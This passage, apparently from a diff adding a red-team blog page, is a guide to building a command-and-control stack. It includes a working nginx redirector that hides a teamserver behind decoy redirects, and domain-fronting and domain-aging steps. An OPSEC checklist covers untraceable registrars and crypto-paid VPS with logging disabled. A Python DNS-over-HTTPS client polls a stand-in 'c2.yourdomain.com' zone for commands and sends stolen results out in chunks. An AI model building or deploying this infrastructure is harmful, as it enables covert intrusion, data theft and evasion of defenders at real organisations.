+  <li><code class="language-plaintext highlighter-rouge">trustedsec/COFFLoader</code> - canonical open-source reference</li>
+  <li><code class="language-plaintext highlighter-rouge">Yaxser/COFFLoader2</code> - with symbol obfuscation</li>
+  <li><code class="language-plaintext highlighter-rouge">RtlDallas/NiCOFF</code> - Rust implementation for Rust implants</li>
+</ul>
+
+<h2 id="layer-3-redirector-infrastructure">Layer 3: Redirector Infrastructure<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#layer-3-redirector-infrastructure" aria-label="Copy link to Layer 3: Redirector Infrastructure"><span aria-hidden="true">#</span></a></h2>
+
+<p>Pointing implants directly at your teamserver is a single point of failure. The moment the teamserver IP is burned, every beacon in the engagement is dead. The solution: <strong>disposable redirector servers</strong> that proxy valid C2 traffic to the teamserver and serve decoy content for everything else.</p>
+
+<h3 id="typical-topology">Typical Topology<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#typical-topology" aria-label="Copy link to Typical Topology"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>[ implant ] → [ CDN (optional) ] → [ redirector VPS ] → [ teamserver ]
+     ↑                                    ↓
+  public IP                          operator VPN only
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<ul>
+  <li>Redirector IP is on the implant’s C2 config.</li>
+  <li>Teamserver is inside a VPN only you can reach.</li>
+  <li>Redirector can be burned and rebuilt in 10 minutes.</li>
+</ul>
+
+<h3 id="minimal-nginx-redirector">Minimal Nginx Redirector<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#minimal-nginx-redirector" aria-label="Copy link to Minimal Nginx Redirector"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="k">server</span> <span class="p">{</span>
+    <span class="kn">listen</span> <span class="mi">443</span> <span class="s">ssl</span> <span class="s">http2</span><span class="p">;</span>
+    <span class="kn">server_name</span> <span class="s">cdn.totally-legit.com</span><span class="p">;</span>
+
+    <span class="kn">ssl_certificate</span>     <span class="n">/etc/letsencrypt/live/cdn.totally-legit.com/fullchain.pem</span><span class="p">;</span>
+    <span class="kn">ssl_certificate_key</span> <span class="n">/etc/letsencrypt/live/cdn.totally-legit.com/privkey.pem</span><span class="p">;</span>
+
+    <span class="c1"># Lock down to the malleable profile's URIs + User-Agent</span>
+    <span class="kn">if</span> <span class="s">(</span><span class="nv">$http_user_agent</span> <span class="s">!~</span> <span class="s">"Mozilla/5</span><span class="err">\</span><span class="s">.0</span> <span class="err">\</span><span class="s">(Windows</span> <span class="s">NT</span> <span class="mi">10</span><span class="err">\</span><span class="s">.0.*AppleWebKit")</span> <span class="p">{</span>
+        <span class="kn">return</span> <span class="mi">301</span> <span class="s">https://www.wikipedia.org</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kn">location</span> <span class="n">/api/beacon</span> <span class="p">{</span>
+        <span class="kn">proxy_pass</span> <span class="s">https://teamserver.internal</span><span class="p">;</span>
+        <span class="kn">proxy_set_header</span> <span class="s">Host</span>            <span class="nv">$host</span><span class="p">;</span>
+        <span class="kn">proxy_set_header</span> <span class="s">X-Real-IP</span>       <span class="nv">$remote_addr</span><span class="p">;</span>
+        <span class="kn">proxy_set_header</span> <span class="s">X-Forwarded-For</span> <span class="nv">$proxy_add_x_forwarded_for</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kn">location</span> <span class="n">/api/results</span> <span class="p">{</span>
+        <span class="kn">proxy_pass</span> <span class="s">https://teamserver.internal</span><span class="p">;</span>
+        <span class="kn">proxy_set_header</span> <span class="s">Host</span> <span class="nv">$host</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1"># Everything else → decoy</span>
+    <span class="kn">location</span> <span class="n">/</span> <span class="p">{</span>
+        <span class="kn">return</span> <span class="mi">301</span> <span class="s">https://www.wikipedia.org</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">nginx</span></pre></div></div>
+
+<p>The rule is: <strong>if it doesn’t look like my implant’s traffic, it doesn’t reach my teamserver</strong>. Blue teams fingerprinting the C2 infrastructure see a normal-looking CDN host that 301s away on unexpected requests.</p>
+
+<h3 id="domain-fronting-when-cdn-supports-it">Domain Fronting (when CDN supports it)<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#domain-fronting-when-cdn-supports-it" aria-label="Copy link to Domain Fronting (when CDN supports it)"><span aria-hidden="true">#</span></a></h3>
+
+<p>TLS SNI and HTTP <code class="language-plaintext highlighter-rouge">Host</code> header can differ. Firewalls make policy decisions on SNI (encrypted but parseable in ClientHello); the CDN routes on <code class="language-plaintext highlighter-rouge">Host</code>. Put a trusted CDN domain in SNI, your evil one in <code class="language-plaintext highlighter-rouge">Host</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>GET /api/beacon HTTP/1.1
+Host: cdn.totally-legit.com          ← CDN routes here
+User-Agent: Mozilla/5.0 ...
+                                      ← SNI in TLS: www.cdn-of-big-tech.com
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<p>Blue team sees the SNI (trusted CDN). Traffic is encrypted. CDN internally forwards to your redirector. This was the technique that made AWS CloudFront, Google App Engine, and Fastly popular for C2 - until those providers started blocking it. As of 2026 it still works on Cloudfront + a compliant origin, on Azure Front Door, and on a handful of smaller CDNs.</p>
+
+<h3 id="categorization">Categorization<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#categorization" aria-label="Copy link to Categorization"><span aria-hidden="true">#</span></a></h3>
+
+<p>Fresh domains look suspicious to proxies and URL filters. Age domains for <strong>30-90 days</strong> by:</p>
+<ul>
+  <li>Registering months in advance</li>
+  <li>Running <code class="language-plaintext highlighter-rouge">expireddomains.net</code>-style searches for dropped aged domains with categorization intact</li>
+  <li>Submitting to Cisco Umbrella and Bluecoat for “Business” or “Computers &amp; Internet” categorization before use</li>
+  <li>Populating with benign content - a few pages about the fake business</li>
+</ul>
+
+<h3 id="opsec-checklist-for-infrastructure">OPSEC Checklist for Infrastructure<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#opsec-checklist-for-infrastructure" aria-label="Copy link to OPSEC Checklist for Infrastructure"><span aria-hidden="true">#</span></a></h3>
+
+<ul>
+  <li>Domain: aged ≥ 30 days, categorized, no WHOIS link to your ops identity</li>
+  <li>Registrar: accepts privacy, no payment traceable to you</li>
+  <li>VPS provider: accepts crypto, rotate per engagement</li>
+  <li>SSL: Let’s Encrypt (free, ubiquitous, blends in)</li>
+  <li>Teamserver access: <strong>only via VPN</strong>; firewall off port 80/443 from the internet</li>
+  <li>Logs on redirector: disabled (<code class="language-plaintext highlighter-rouge">access_log off;</code> in nginx)</li>
+  <li>Redirector rebuild script: fully automated, 5 min from zero to ready</li>
+</ul>
+
+<h2 id="layer-4-dns-over-https-covert-channel">Layer 4: DNS-over-HTTPS Covert Channel<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#layer-4-dns-over-https-covert-channel" aria-label="Copy link to Layer 4: DNS-over-HTTPS Covert Channel"><span aria-hidden="true">#</span></a></h2>
+
+<p>When HTTPS to your own domain is too suspicious, DoH is the escape hatch. The implant sends DNS queries as HTTPS requests to a public resolver (Cloudflare’s <code class="language-plaintext highlighter-rouge">1.1.1.1</code>, Google’s <code class="language-plaintext highlighter-rouge">8.8.8.8</code>). To any network monitor, the implant is making legitimate HTTPS requests to a trusted CDN - indistinguishable from a browser using secure DNS.</p>
+
+<h3 id="how-the-channel-works">How the Channel Works<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#how-the-channel-works" aria-label="Copy link to How the Channel Works"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>Implant:   HTTPS POST https://cloudflare-dns.com/dns-query
+           Body: DNS query for &lt;cmd_id&gt;.c2.yourdomain.com TXT
+                                          ↓
+Cloudflare recurses to your authoritative nameserver
+                                          ↓
+Your NS returns a TXT record encoding the next task
+                                          ↓
+Implant: decodes TXT, executes, sends results via A-record lookups:
+           HTTPS POST ... query for &lt;chunk1&gt;.&lt;chunk2&gt;.exfil.c2.yourdomain.com
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<h3 id="why-it-evades-detection">Why It Evades Detection<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#why-it-evades-detection" aria-label="Copy link to Why It Evades Detection"><span aria-hidden="true">#</span></a></h3>
+
+<ul>
+  <li>All traffic is <strong>HTTPS to Cloudflare’s well-known public IP</strong>. Zero signals at the network layer.</li>
+  <li>The implant doesn’t even need a custom DNS resolver; it speaks DoH directly.</li>
+  <li>DNS monitoring tools (Passive DNS, Bro/Zeek DNS parsing) never see your queries - they’re inside encrypted HTTP bodies.</li>
+  <li>Cloudflare caches recursive results - from the target’s network, queries might not even egress on every beacon.</li>
+</ul>
+
+<h3 id="minimal-client-python-illustration">Minimal Client (Python Illustration)<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#minimal-client-python-illustration" aria-label="Copy link to Minimal Client (Python Illustration)"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="kn">import</span> <span class="nn">base64</span><span class="p">,</span> <span class="n">requests</span>
+<span class="kn">from</span> <span class="nn">dns</span> <span class="kn">import</span> <span class="n">message</span><span class="p">,</span> <span class="n">rdatatype</span>
+
+<span class="n">SESSION</span>  <span class="o">=</span> <span class="s">"abc123"</span>
+<span class="n">C2_ZONE</span>  <span class="o">=</span> <span class="s">"c2.yourdomain.com"</span>
+<span class="n">RESOLVER</span> <span class="o">=</span> <span class="s">"https://cloudflare-dns.com/dns-query"</span>
+
+<span class="k">def</span> <span class="nf">doh_query</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">qtype</span><span class="o">=</span><span class="n">rdatatype</span><span class="p">.</span><span class="n">TXT</span><span class="p">):</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">message</span><span class="p">.</span><span class="n">make_query</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">qtype</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">RESOLVER</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">msg</span><span class="p">.</span><span class="n">to_wire</span><span class="p">(),</span>
+                      <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/dns-message"</span><span class="p">})</span>
+    <span class="k">return</span> <span class="n">message</span><span class="p">.</span><span class="n">from_wire</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">poll</span><span class="p">():</span>
+    <span class="n">ans</span> <span class="o">=</span> <span class="n">doh_query</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">SESSION</span><span class="si">}</span><span class="s">.beacon.</span><span class="si">{</span><span class="n">C2_ZONE</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">rr</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">.</span><span class="n">answer</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">rr</span><span class="p">.</span><span class="n">items</span><span class="p">:</span>
+            <span class="n">cmd</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">item</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="s">'"'</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
+            <span class="k">return</span> <span class="n">cmd</span>
+    <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">exfil</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">chunk_size</span><span class="o">=</span><span class="mi">60</span><span class="p">):</span>
+    <span class="n">blob</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">().</span><span class="n">rstrip</span><span class="p">(</span><span class="s">"="</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">blob</span><span class="p">),</span> <span class="n">chunk_size</span><span class="p">):</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="n">blob</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">chunk_size</span><span class="p">]</span>
+        <span class="n">doh_query</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">chunk</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">session</span><span class="si">}</span><span class="s">.exfil.</span><span class="si">{</span><span class="n">C2_ZONE</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">qtype</span><span class="o">=</span><span class="n">rdatatype</span><span class="p">.</span><span class="n">A</span><span class="p">)</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">python</span></pre></div></div>
+
+<h3 id="authoritative-nameserver-side">Authoritative Nameserver Side<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#authoritative-nameserver-side" aria-label="Copy link to Authoritative Nameserver Side"><span aria-hidden="true">#</span></a></h3>
+
+<p>On the server side, you run an authoritative DNS server (<code class="language-plaintext highlighter-rouge">dnslib</code>, <code class="language-plaintext highlighter-rouge">bindserver</code>, or CoreDNS with a plugin) that:</p>
+
+<ol>
+  <li>Receives queries for <code class="language-plaintext highlighter-rouge">&lt;session&gt;.beacon.c2.yourdomain.com</code></li>
+  <li>Looks up the next task for that session</li>
+  <li>Returns the base64-encoded task as a TXT record</li>
+  <li>Receives <code class="language-plaintext highlighter-rouge">&lt;chunk&gt;.&lt;session&gt;.exfil.c2.yourdomain.com</code> lookups</li>
+  <li>Reassembles chunks per-session into the original result blob</li>
+</ol>
+
+<h3 id="throughput--limits">Throughput &amp; Limits<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#throughput--limits" aria-label="Copy link to Throughput &amp; Limits"><span aria-hidden="true">#</span></a></h3>
+
+<ul>
+  <li>Max TXT record: ~255 bytes per string, multiple strings allowed</li>
+  <li>Max DNS name: 253 chars total, 63 per label - practical chunk size ~60 bytes</li>
+  <li>Beacon cadence: one query every 30-60 seconds blends in; faster starts to look anomalous</li>
+</ul>
+
+<p>Not great for large exfil. Use DoH for <strong>command-and-control only</strong> - task/result channels. For bulk data, switch to a second covert channel (file upload to a legitimate-looking blob storage, SSH out of the domain you own, or split across multiple beacons).</p>
+
+<h3 id="detection">Detection<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#detection" aria-label="Copy link to Detection"><span aria-hidden="true">#</span></a></h3>
+
+<p>Advanced defenders with TLS inspection (MITM proxy) can see the decrypted DoH body. Indicators:</p>
+
+<ul>
+  <li>Periodic DoH queries with same label prefix (your session ID)</li>
+  <li>TXT record queries at volume from one host</li>
+  <li>Base64 patterns inside DNS labels</li>
+</ul>
+
+<p>Mitigations on your side:</p>
+
+<ul>
+  <li>Rotate session IDs over time</li>
+  <li>Use realistic-looking subdomains (<code class="language-plaintext highlighter-rouge">api</code>, <code class="language-plaintext highlighter-rouge">analytics</code>, <code class="language-plaintext highlighter-rouge">cdn</code>) rather than <code class="language-plaintext highlighter-rouge">beacon</code> / <code class="language-plaintext highlighter-rouge">exfil</code></li>
+  <li>Blend with real browser DoH traffic - fire background queries for real TLD domains too</li>
+  <li>Switch to <code class="language-plaintext highlighter-rouge">application/dns-json</code> format for variety</li>
+</ul>
+
+<h2 id="how-the-layers-fit">How the Layers Fit<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#how-the-layers-fit" aria-label="Copy link to How the Layers Fit"><span aria-hidden="true">#</span></a></h2>
+
+<p>A real engagement looks like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>Rust implant  (Layer 1) sleeps with jitter
+      ↓
+beacons over HTTPS via a CDN  (Layer 3 - redirector)
+      ↓
+CDN routes to disposable redirector VPS
+      ↓
+redirector filters malformed traffic, forwards valid C2 to teamserver (VPN-only)
+      ↓
+teamserver responds with a task; if it's "run this BOF":
+      ↓
+implant loads BOF with the COFF loader  (Layer 2)
+      ↓
+BOF executes (e.g. Kerberoast, Shadow Credentials)
+      ↓
+results marshalled back over the same channel
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<p>When the primary redirector gets burned, the implant has a secondary <strong>DoH channel</strong> (Layer 4) as fallback. Implants are expected to live for days/weeks; single-channel C2 rarely does.</p>
+
+<h2 id="recommended-reading">Recommended Reading<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#recommended-reading" aria-label="Copy link to Recommended Reading"><span aria-hidden="true">#</span></a></h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Mr-Un1k0d3r/CobaltStrike-BOF-Templates</code> - BOF starting points with clean patterns</li>
+  <li><code class="language-plaintext highlighter-rouge">Helpsystems/nanodump</code> - production-grade BOF for LSASS mini-dumps</li>
+  <li><code class="language-plaintext highlighter-rouge">0xRick/DoH-C2</code> - reference DoH implementation</li>
+  <li>RedSiege “Infrastructure for Red Teamers” - redirector + CDN design patterns</li>
+</ul>
+
+<h2 id="summary">Summary<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#summary" aria-label="Copy link to Summary"><span aria-hidden="true">#</span></a></h2>
+
+<p>Good C2 isn’t a single piece of tooling. It’s a <strong>stack of independent, replaceable layers</strong>: an implant that minimizes its footprint, a loader that lets you extend capabilities without ever redeploying, redirector infrastructure that survives discovery, and covert channels that survive outright blocking. Learn each layer deeply - not to replace commercial tools, but so that when they fail, you can fix it.</p>
+
+<blockquote>
+  <p>The best operators don’t have a better C2. They have a C2 they understand layer-by-layer, so nothing surprises them mid-engagement.</p>
+</blockquote>
+
+    </div>
+
+    
+
+    
+    <section class="related">
+      <div class="label" style="margin-bottom:14px">Continue · C2 development</div>
+      <div class="related-grid">
+        
+          
+          <a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/" class="related-card">
+            <span class="related-date">Apr 09, 2026</span>
+            <span class="related-t">Beacon Object Files from Scratch: COFF Loading, Dynamic Resolution, and Battle-Tested Tradecraft</span>
+            <span class="related-desc">A deep guide to writing Beacon Object Files - from understanding the COFF format and Co...</span>
+            
+              <span class="wu-diff hard" style="align-self:flex-start">HARD</span>
+            
+          </a>
+        
+          
+          <a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/" class="related-card">
+            <span class="related-date">Mar 20, 2026</span>
+            <span class="related-t">Designing a Modern C2 Implant: Architecture and OPSEC</span>
+            <span class="related-desc">A comprehensive guide to C2 implant architecture - covering communication protocols, ex...</span>
+            
+              <span class="wu-diff hard" style="align-self:flex-start">HARD</span>
+            
+          </a>
+        
+      </div>
+    </section>
+    
+
+    
+    
+    
+
+    <div class="article-foot">
+      <a href="https://robinx0.github.io/" class="btn-g">← Home</a>
+      <a href="https://robinx0.github.io/writeups?cat=C2+development" class="btn-g">More C2 development →</a>
+    </div>
+  </div>
+</article>
+
+    </div>
+
+    
+
+  </main>
+
+  
+
+  <!-- Image lightbox -->
+  <div class="lightbox-overlay" id="lightbox">
+    <button class="lightbox-close" type="button" aria-label="Close lightbox">×</button>
+    <button class="lightbox-nav lightbox-prev" type="button" aria-label="Previous image">‹</button>
+    <button class="lightbox-nav lightbox-next" type="button" aria-label="Next image">›</button>
+    <img class="lightbox-img" id="lightbox-img" alt="">
+    <div class="lightbox-caption mono" id="lightbox-caption"></div>
+  </div>
+
+  
+
+
+</body></html>
